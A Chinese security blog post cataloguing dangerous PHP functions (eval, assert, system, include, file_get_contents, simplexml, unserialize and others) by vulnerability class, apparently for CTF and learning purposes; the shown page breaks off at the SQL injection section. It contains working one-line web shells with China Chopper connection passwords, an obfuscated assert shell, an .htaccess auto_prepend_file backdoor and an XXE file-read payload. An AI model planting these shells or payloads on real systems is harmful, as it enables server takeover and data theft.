<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    <meta charset="utf8" />
    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
    <title>
      
        php危险函数 | 东隅's blog
      
    </title>
    <meta name="description" content=""/>
    <meta name="keywords" content=""/>
    
      <link rel="apple-touch-icon"
            sizes="180x180"
            href="/images/jocker.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="32x32"
            href="/images/jocker.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="16x16"
            href="/images/jocker.png"/>
    
    
      <link rel="mask-icon"
            href="/images/jocker.png"
            color=""/>
    
    
    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
    
    
  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
  

  <meta name="generator" content="Hexo 5.4.0"></head>
  <body>
    <div class="head">
      <div class="nav">
        <a href="/" class="nav-logo">
          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
        </a>
        <input id="navBtn" type="checkbox"/>
        <div class="nav-menu">
          
            
              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
            
              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
            
              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
            
          
        </div>
        <label class="nav-btn" for="navBtn"></label>
      </div>
    </div>
    <div class="body">
      
  <article class="post-content">
    <div class="post-inner">
      <div class="post-content__head">
        <div class="post-title">php危险函数</div>
        <div class="post-info">
          
  
    <a href="/tags/php%E5%AE%89%E5%85%A8/" class="post-tag">#php安全</a>
  


          <span class="post-date">2023-04-29</span>
        </div>
      </div>
      <div id="postBody" class="post-content__body--toc">
        <div id="tocAnchor" class="toc-anchor">
          <ol id="toc" class="post-toc">
            
              <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell%E5%87%BD%E6%95%B0"><span class="toc-text">getshell函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">代码执行的危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">命令执行的危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">文件包含的危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">SSRF的危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">XXE的危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">文件操作相关函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">敏感信息的危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">反序列化危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">SQL注入的危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
            
          </ol>
        </div>
        
          <div class="post-gallery">
            
          </div>
        
        <p>[TOC]</p>
<h2 id="getshell函数"><a href="#getshell函数" class="headerlink" title="getshell函数"></a>getshell函数</h2><ol>
<li><p><code>eval</code> 函数<br>传入的参数必须为PHP代码，既需要==以分号结尾==。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">#命令執行：cmd=system(whoami);*</span></span><br><span class="line">*<span class="comment">#菜刀连接密码：cmd*</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>assert</code> 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">#assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然你加上也可以。*</span></span><br><span class="line">*<span class="comment">#命令執行：cmd=system(whoami)*</span></span><br><span class="line">*<span class="comment">#菜刀连接密码：cmd*</span></span><br><span class="line"><span class="meta">&lt;?php</span> @assert(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>preg_replace</code> 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">#preg_replace(&#x27;正则规则&#x27;,&#x27;替换字符&#x27;，&#x27;目标字符&#x27;)*</span></span><br><span class="line">*<span class="comment">#执行命令和上传文件参考assert函数(不需要加分号)。*</span></span><br><span class="line">*<span class="comment">#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。*</span></span><br><span class="line">preg_replace(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;jutst test&quot;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p><code>create_function</code> 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">#创建匿名函数执行代码*</span></span><br><span class="line">*<span class="comment">#执行命令和上传文件参考eval函数(必须加分号)。*</span></span><br><span class="line">*<span class="comment">#菜刀连接密码：cmd*</span></span><br><span class="line"><span class="variable">$func</span> =create_function(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="variable">$func</span>();</span><br></pre></td></tr></table></figure></li>
<li><p><code>array_map</code> 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。*</span></span><br><span class="line">*<span class="comment">#命令执行http://localhost/123.php?func=system cmd=whoami*</span></span><br><span class="line">*<span class="comment">#菜刀连接http://localhost/123.php?func=assert 密码：cmd*</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=array_map(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_array</span>;</span><br></pre></td></tr></table></figure></li>
<li><p><code>call_user_func</code> 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">#传入的参数作为assert函数的参数*</span></span><br><span class="line">*<span class="comment">#cmd=system(whoami)*</span></span><br><span class="line">*<span class="comment">#菜刀连接密码：cmd*</span></span><br><span class="line">call_user_func(<span class="string">&quot;assert&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">或者直接没有参数</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="string">&quot;phpinfo&quot;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p><code>call_user_func_array</code> 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">#将传入的参数作为数组的第一个值传递给assert函数*</span></span><br><span class="line">*<span class="comment">#cmd=system(whoami)*</span></span><br><span class="line">*<span class="comment">#菜刀连接密码：cmd*</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line">call_user_func_array(<span class="string">&quot;assert&quot;</span>,<span class="variable">$array</span>);</span><br></pre></td></tr></table></figure></li>
<li><p><code>array_filter</code> 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">#用回调函数过滤数组中的元素：array_filter(数组,函数)*</span></span><br><span class="line">*<span class="comment">#命令执行func=system&amp;cmd=whoami*</span></span><br><span class="line">*<span class="comment">#菜刀连接http://localhost/123.php?func=assert 密码cmd*</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">array_filter(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br></pre></td></tr></table></figure></li>
<li><p><code>uasort</code> 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">#php环境&gt;=&lt;5.6才能用*</span></span><br><span class="line">*<span class="comment">#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。*</span></span><br><span class="line">*<span class="comment">#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);*</span></span><br><span class="line">*<span class="comment">#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd]) 密码：cmd*</span></span><br><span class="line">usort(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>写入.htaccess</p>
</li>
</ol>
<p>  php_value auto_prepend_file 是用来在页面底部加载文件的<br>这也是为什么我们要去写入#<?php system('cat /fla'.'g');?>\ 在文件底部<br>而#应该是.hatccess文件特有的写入形式，没有的话会直接报错500</p>
<p>​      它比较灵活，不需要重启服务器，也不需要管理员权限。其格式为php_value 名称 值，在这里写入🐎（以注释的方式），然后在页面顶部加载它（auto_prepend_file）就行：</p>
<p>.htaccess文件的内容：php_value auto_prepend_file .htaccess #<?php phpinfo();?></p>
<h2 id="代码执行的危险函数"><a href="#代码执行的危险函数" class="headerlink" title="代码执行的危险函数"></a>代码执行的危险函数</h2><ul>
<li>eval() 把字符串作为php代码执行</li>
</ul>
<p>早期php一句话木马都用这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>assert() 检查一个断言是否为<code>false</code>，将字符串作为php代码执行</li>
</ul>
<p>同样经常被用作一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert(@$_POST[&#x27;shell&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>preg_replace() 执行正则表达式的搜索和替换</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192425.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192425.png" alt="img"></a><br>当匹配模式<code>/e</code>时，该函数会将<code>$replacement</code>作为php代码执行</p>
<p><code>preg_replace(&quot;/test/e&quot;,$_GET[&quot;shell&quot;],&quot;just test&quot;);</code><br><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192718.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192718.png" alt="img"></a></p>
<ul>
<li>create_function() 创建一个匿名函数</li>
</ul>
<p>跟python的lambda语句类似，在php7.2.0后被废弃<br><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193030.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193030.png" alt="img"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$newfunc = create_function(&#x27;$v&#x27;, &#x27;return system($v);&#x27;);</span><br><span class="line">$newfunc(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193314.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193314.png" alt="img"></a></p>
<ul>
<li>array_map() 为数组的每个元素应用回调函数</li>
</ul>
<p>array_map()函数将用户自定义的函数作用到数组中的每个值上，并返回用户自定义函数作用后带有新值的数组，这里相当于一种动态调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $func=$_GET[&#x27;func&#x27;];</span><br><span class="line">    $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">    $array[0]=$cmd;</span><br><span class="line">    $new_array=array_map($func,$array);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194224.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194224.png" alt="img"></a></p>
<ul>
<li>call_user_func() 把第一个参数作为回调函数调用，其他参数是回调函数的参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    @call_user_func(&quot;assert&quot;,$_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194550.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194550.png" alt="img"></a></p>
<ul>
<li>call_user_func_array() 调用回调函数，并将第一个数组参数作为回调函数参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">    $array[0]=$cmd;</span><br><span class="line">    @call_user_func_array(&quot;assert&quot;,$array);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194829.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194829.png" alt="img"></a></p>
<ul>
<li>array_filter() 使用回调函数过滤数组的元素</li>
</ul>
<p>依次将数组中的每个值传递到<code>callback</code>函数，如果<code>callback</code>函数返回<code>true</code>，则数组的当前值会被包含在返回的结果数组中，数组的键名保留不变</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">    $array1=array($cmd);</span><br><span class="line">    $func =$_GET[&#x27;func&#x27;];</span><br><span class="line">    array_filter($array1,$func);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195216.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195216.png" alt="img"></a></p>
<h2 id="命令执行的危险函数"><a href="#命令执行的危险函数" class="headerlink" title="命令执行的危险函数"></a>命令执行的危险函数</h2><ul>
<li>system() 执行外部程序，并显示输出</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195355.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195355.png" alt="img"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195435.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195435.png" alt="img"></a></p>
<ul>
<li>exec() 执行外部程序</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195543.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195543.png" alt="img"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    echo exec(&quot;whoami&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195624.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195624.png" alt="img"></a></p>
<ul>
<li>shell_exec() 通过shell环境执行命令，并将完整的输出以字符串的方式返回</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    echo shell_exec(&quot;whoami&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195851.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195851.png" alt="img"></a></p>
<ul>
<li>passthru() 执行外部程序并且显示原始输出</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    passthru(&quot;whoami&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>proc_open() 执行一个命令，并且打开用来输入/输出的文件指针</li>
<li>pcntl_exec() 在当前进程空间执行指定程序</li>
<li>popen() 打开进程文件指针</li>
<li>反引号，实质上还是调用的<code>shell_exec()</code>函数，在CTF题目里面有的时候会忘记过滤导致直接拿到flag</li>
</ul>
<h2 id="文件包含的危险函数"><a href="#文件包含的危险函数" class="headerlink" title="文件包含的危险函数"></a>文件包含的危险函数</h2><p>php中包含的函数一共有四个，主要作用为包含并运行指定文件</p>
<ul>
<li>require() 函数</li>
<li>inclue() 函数</li>
<li>require_once() 函数</li>
<li>include_once() 函数</li>
</ul>
<p><code>include()</code>与<code>require_once()</code>主要的区别是：<code>include()</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续运行；而<code>require()</code>函数出现错误时，会直接报错并退出程序的执行</p>
<p><code>require_once()</code>和<code>include_once()</code>，显然表示的是文件只包含一次的意思，避免函数重定义和变量重新赋值等问题</p>
<p>文件包含还分为了本地文件包含和远程文件包含，这里就不再进行赘述</p>
<p>当被包含文件可控的情况下，我们可以包含任意文件，从而达到GetShell的目的，也可以使用filter伪协议读取文件内容，关于php伪协议会在后面的文章进行介绍</p>
<h2 id="SSRF的危险函数"><a href="#SSRF的危险函数" class="headerlink" title="SSRF的危险函数"></a>SSRF的危险函数</h2><ul>
<li>file_get_contents()</li>
<li>fsockopen()</li>
<li>curl_exec()</li>
<li>fopen()</li>
<li>readfile()</li>
<li>…<br>函数使用不当会造成SSRF漏洞</li>
</ul>
<p>利用的相关协议：</p>
<ul>
<li>file协议: 在有回显的情况下，利用file协议可以读取任意的内容</li>
<li>dict协议: 泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
<li>gopher协议: gopher支持发出GET,POST请求，可以通过抓包然后构造成gopher协议的请求</li>
<li>http/s: 探测内网主机存活</li>
</ul>
<p>一个简单的<code>file_get_contents()</code>案例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $url = $_GET[&#x27;url&#x27;];;</span><br><span class="line">    echo file_get_contents($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>直接在本地环境上测试了，使用file协议读一下<code>system.ini</code>文件<br><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311003419.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311003419.png" alt="img"></a></p>
<h2 id="XXE的危险函数"><a href="#XXE的危险函数" class="headerlink" title="XXE的危险函数"></a>XXE的危险函数</h2><p>XXE指XML外部实体注入</p>
<p>当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取，系统命令执行，内网端口探测，攻击内网网站等危害</p>
<p>这类漏洞可以根据危险函数逆推回去，危险函数有:</p>
<ul>
<li>simplexml_load_string() 转换形式良好的 XML 字符串为 SimpleXMLElement 对象，然后输出对象的键和元素</li>
<li>asXML()</li>
<li>simplexml_load_file()</li>
<li>simplexml_import_dom()</li>
<li>…</li>
</ul>
<p>本地搭建一个存在XXE的环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    error_reporting(0); //禁用外部实体注入 设置为false 相当于不禁用 </span><br><span class="line">    libxml_disable_entity_loader (false); </span><br><span class="line">    //php://input ===&gt; post请求体的内容 </span><br><span class="line">    $xmlfile = file_get_contents(&#x27;php://input&#x27;); </span><br><span class="line">    //exit(-1); </span><br><span class="line">    //创建一个DOMDocument类型的对象 </span><br><span class="line">    $dom = new DOMDocument(); </span><br><span class="line">    //loadXML 从字符串中读取，生成一个DOMDocument类型的对象 </span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    //var_dump($dom); </span><br><span class="line">    //exit(-1); </span><br><span class="line">    //把一个DOMDocument类型的对象转发成一个simpleXML类型的对象 </span><br><span class="line">    $creds = simplexml_import_dom($dom); //因为存在SIMPLEXMLelement存在__toString__魔术方法， //因此可以直接打印 </span><br><span class="line">    echo $creds; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [ </span><br><span class="line">&lt;!ENTITY goodies SYSTEM </span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=C:/Windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311123228.png"><img src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311123228.png" alt="img"></a></p>
<p>成功读取base64加密后的<code>system.ini</code>文件内容</p>
<p>php防御手段：</p>
<blockquote>
<p>设置<code>libxml_disable_entity_loader</code>=TRUE来禁用外部实体</p>
</blockquote>
<h2 id="文件操作相关函数"><a href="#文件操作相关函数" class="headerlink" title="文件操作相关函数"></a>文件操作相关函数</h2><p>文件操作无外乎<code>增删改查</code>，在不同场景下利用手法不同</p>
<ul>
<li>增,改 : 写入shell相关的内容</li>
<li>删 : 删除.lock文件导致CMS重新安装</li>
<li>查 读取配置等文件，拿到敏感信息</li>
<li>…</li>
</ul>
<p>文件操作的函数有很多:</p>
<ul>
<li>unlink() 传入文件名删除文件</li>
<li>copy() 复制文件</li>
<li>highlight_file() 对php文件语法高亮显示</li>
<li>show_source() highlight_file的别名</li>
<li>file_get_contents()</li>
<li>fopen()</li>
<li>parse_ini_file()</li>
<li>readfile()</li>
<li>fread()</li>
<li>…</li>
</ul>
<h2 id="敏感信息的危险函数"><a href="#敏感信息的危险函数" class="headerlink" title="敏感信息的危险函数"></a>敏感信息的危险函数</h2><ul>
<li>phpinfo() 输出关于php配置的信息</li>
<li>getenv() 获取一个环境变量的值</li>
<li>get_current_user() 获取当前php脚本所有者的名称</li>
<li>getlastmod() 获取页面最后修改的时间</li>
<li>ini_get() 获取一个配置选项的值</li>
<li>glob() 寻找与模式匹配的文件路径</li>
</ul>
<h2 id="反序列化危险函数"><a href="#反序列化危险函数" class="headerlink" title="反序列化危险函数"></a>反序列化危险函数</h2><ul>
<li>序列化函数 <code>serialize()</code></li>
<li>反序列化函数 <code>unserialize()</code></li>
<li>php十六个魔术方法，魔术方法命名是以符号__开头的<ul>
<li><code>__construct()</code> 类的构造函数</li>
<li><code>__destruct()</code> 类的析构函数</li>
<li><code>__call()</code> 在对象中调用一个不可访问方法时调用</li>
<li><code>__callStatic()</code> 用静态方式中调用一个不可访问方法时调用</li>
<li><code>__get()</code> 获得一个类的成员变量时调用</li>
<li><code>__set()</code>设置一个类的成员变量时调用</li>
<li><code>__isset()</code> 当对不可访问属性调用isset()或empty()时调用</li>
<li><code>__unset()</code> 当对不可访问属性调用unset()时被调用。</li>
<li><code>__sleep()</code> 执行serialize()时，先会调用这个函数</li>
<li><code>__wakeup()</code> 执行unserialize()时，先会调用这个函数</li>
<li><code>__toString()</code> 类被当成字符串时的回应方法</li>
<li><code>__invoke()</code> 调用函数的方式调用一个对象时的回应方法</li>
<li><code>__set_state()</code> 调用var_export()导出类时，此静态方法会被调用。</li>
<li><code>__clone()</code> 当对象复制完成时调用</li>
<li><code>__autoload()</code> 尝试加载未定义的类</li>
<li><code>__debugInfo()</code> 打印所需调试信息</li>
</ul>
</li>
</ul>
<p>关于如何利用反序列化漏洞，取决于应用程序的逻辑、可用的类和魔法方法。</p>
<p><code>unserialize</code>的参数用户可控，攻击者可以构造恶意的序列化字符串。当应用程序将恶意字符串反序列化为对象后，也就执行了攻击者指定的操作，如代码执行、任意文件读取等</p>
<h2 id="SQL注入的危险函数"><a href="#SQL注入的危险函数" class="headerlink" title="SQL注入的危险函数"></a>SQL注入的危险函数</h2><ul>
<li>mysql_query() 发送一条MySQL查询</li>
